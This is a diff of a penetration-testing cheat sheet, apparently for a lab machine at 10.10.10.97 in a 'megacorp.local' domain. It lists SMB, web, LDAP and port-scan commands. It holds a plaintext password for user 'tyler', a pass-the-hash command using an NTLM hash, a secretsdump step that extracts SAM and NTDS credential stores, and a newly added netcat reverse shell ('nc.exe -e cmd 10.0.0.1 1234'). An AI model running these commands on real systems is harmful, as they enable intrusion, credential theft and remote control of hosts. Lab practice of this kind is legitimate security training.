@@ -52,14 +52,19 @@ CME - Run as Root
 cme smb 10.10.10.97 -u '' -p '' --shares
 cme smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
 smbclient -N -L 10.10.10.97
-mount -t cifs '//10.10.10.97/directory' smb -v -o user=username,[pass='92g!mA8BGjOirkL%OG*&']
+mount -t cifs '//10.10.10.97/new-site' smb -v -o user=tyler
 umount smb
 
 #HTTP 80
 feroxbuster -u http://10.10.10.97/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/
 directory-list-2.3-medium.txt --extract-links
 use raft after.
-nikto -host http://10.10.10.97 -C all -o nikto-scan.htm
+nikto -host http://10.10.10.97 -C all -o nikto-scan.html
+
+#ReverseShells
+If shell breaks use NC to establish a session
+cp /usr/share/windows-resources/binaries/nc.exe .
+nc.exe -e cmd 10.0.0.1 1234
 
 #LDAP 389/636/3268/3269
 rpcclient -U '' -N 10.10.10.97
@@ -73,7 +78,7 @@ ldapsearch -h 10.10.10.97 -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && c
 pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.97 cmd
 
 #Enumeration
-sudo rustscan --ulimit 5000 10.10.10.97 -- -A -sC -sV --script 'default,vuln' -oX scan | xsltproc scan -o scan.html
+sudo rustscan --ulimit 5000 10.10.10.97 -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scan
 
 #Dump
 secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
